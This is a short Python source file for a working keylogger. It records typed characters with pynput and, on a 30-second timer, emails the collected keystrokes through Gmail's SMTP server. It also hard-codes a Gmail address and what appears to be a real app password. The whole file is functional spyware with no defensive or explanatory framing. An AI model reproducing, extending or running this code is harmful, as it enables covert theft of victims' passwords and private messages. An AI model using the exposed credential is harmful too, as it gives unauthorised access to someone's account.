from pynput.keyboard import Listener, Key
import smtplib
import threading

# Your Gmail and App Password
EMAIL_ADDRESS = "vashshrungare@gmail.com"
EMAIL_PASSWORD = "zcoy wpnu ubiu dhvz"

# Store keystrokes
log = ""

# Function to send email
def send_email(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("[+] Email sent successfully!")
    except Exception as e:
        print("[-] Failed to send email:", e)

# Send report every 30 seconds
def report():
    global log
    if log.strip():  # Only send if log is not empty
        send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, log)
        log = ""
    timer = threading.Timer(30, report)
    timer.start()

# Capture keystrokes
def on_press(key):
    global log
    if hasattr(key, 'char') and key.char is not None:
        log += key.char
    elif key == Key.space:
        log += " "
    elif key == Key.enter:
        log += "\n"
    # Ignore Backspace, Esc, Shift, Ctrl, etc.
    else:
        pass  # Do not log special keys

# Start the keylogger
def start_keylogger():
    with Listener(on_press=on_press) as listener:
        report()
        listener.join()

# Run the keylogger
start_keylogger()
